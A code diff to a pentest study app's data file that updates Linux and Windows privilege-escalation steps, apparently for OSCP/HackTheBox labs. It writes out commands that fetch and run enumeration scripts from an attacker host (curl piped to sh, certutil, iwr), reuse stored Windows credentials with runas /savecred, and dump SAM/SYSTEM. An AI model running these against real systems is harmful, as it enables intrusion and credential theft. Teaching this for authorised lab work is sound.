@@ -709,7 +709,7 @@ const TRACKS=[
  ],tips:["Host files with <code>python3 -m http.server 80</code>, pull with wget or curl.","Keep the listener in its own tmux pane."]},
  {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",steps:[
    {d:"Check sudo rights first, the fastest win",c:"sudo -l",l:"Anything listed almost certainly has an exact escalation on <b>GTFOBins</b>."},
-   {d:"Run the enum script, then actually read it",c:"./linpeas.sh | tee loot/linpeas.txt",l:"The red and yellow highlights are the point. Do not scroll past them."},
+   {d:"Get linpeas onto the box, then actually read it",c:"# on YOUR box, in the folder holding linpeas.sh:\npython3 -m http.server 4444\n# on the TARGET:\nwget http://{LHOST}:4444/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.txt\n# no wget? curl -s http://{LHOST}:4444/linpeas.sh | sh\n# nothing writable but /dev/shm? cd /dev/shm first",l:"Serve and fetch on the <b>same</b> port — that is the mistake people make here. 4444 is fine for the transfer, but it is also the default listener port, so if you are catching a shell on it serve on 80 or 8000 instead. Pipe it straight to <code>sh</code> when you cannot write to disk, at the cost of not keeping the output. Then read it: the red and yellow highlights are the whole point, and scrolling past them is how a box takes an extra hour."},
    {d:"Watch for cron jobs and hidden processes without root",c:"./pspy64 -pf -i 1000   # wget it from your box first",l:"<b>pspy</b> shows every process and cron as it fires, including root ones you cannot see in <code>ps</code>. The fastest way to spot a root cron running a writable script \u2014 the SolidState/Nibbles pattern."},
    {d:"SUID binaries and capabilities",c:"find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null",l:"Both map straight to GTFOBins entries."},
    {d:"Cron jobs and writable scripts",c:"cat /etc/crontab; ls -la /etc/cron*",l:"A root cron running a writable script is game over."},
@@ -759,7 +759,7 @@ const TRACKS=[
    "Actually defeating Defender (obfuscation, AMSI/ETW patching, custom loaders) is a build-your-own skill for authorised work \u2014 the OSCP AV-evasion module and Sektor7's course are the standard places to learn it."]},
  {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",steps:[
    {d:"Check your privileges first",c:"whoami /priv",l:"<b>SeImpersonate or SeAssignPrimaryToken \u2192 a Potato attack to SYSTEM.</b> Note it immediately."},
-   {d:"Run winpeas",c:".\\winpeas.exe",l:"Reads services, creds, and misconfigs. Mind the highlights."},
+   {d:"Get winpeas onto the box and run it",c:"# on YOUR box:  python3 -m http.server 4444\ncertutil.exe -urlcache -f http://{LHOST}:4444/winPEASx64.exe C:\\Windows\\Temp\\wp.exe\n# or, no file on disk:\niwr -Uri http://{LHOST}:4444/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe\nC:\\Windows\\Temp\\wp.exe > C:\\Windows\\Temp\\wp.txt",l:"Reads services, creds and misconfigs. Mind the highlights. Defender eats winPEAS on sight, so expect to need the AV-evasion track, or fall back to the manual checks below — <code>whoami /priv</code>, <code>systeminfo</code> and <code>accesschk</code> cover most of what it would have told you."},
    {d:"System info, services and stored creds",c:"systeminfo; cmdkey /list",l:"Unquoted service paths, weak service perms (accesschk), unattend.xml, registry autologon, saved creds. App password stores too: <b>mRemoteNG</b> (confCons.xml \u2014 decrypt with mremoteng_decrypt), <b>TeamViewer</b> and PuTTY sessions in the registry, and a <b>.vhd/.vhdx</b> on a share (mount it, then <code>reg save</code> the SAM/SYSTEM)."},
    {d:"Re-use a saved credential without knowing it",c:"runas /user:{DOMAIN}\\administrator /savecred \"cmd /c whoami\"",l:"If <code>cmdkey /list</code> shows a stored credential, <code>/savecred</code> runs as that user blind. The Access root."},
    {d:"Hunt Alternate Data Streams (files hiding in NTFS)",c:"dir /R    # PowerShell: Get-Item -Path * -Stream *; then  Get-Content file -Stream <name>",l:"A 0-byte file can carry a password in an ADS. <code>smbclient</code> shows them with <code>allinfo</code>. The Nest trick."}
@@ -1069,7 +1069,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.6.1";
+const APP_VERSION="1.6.2";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
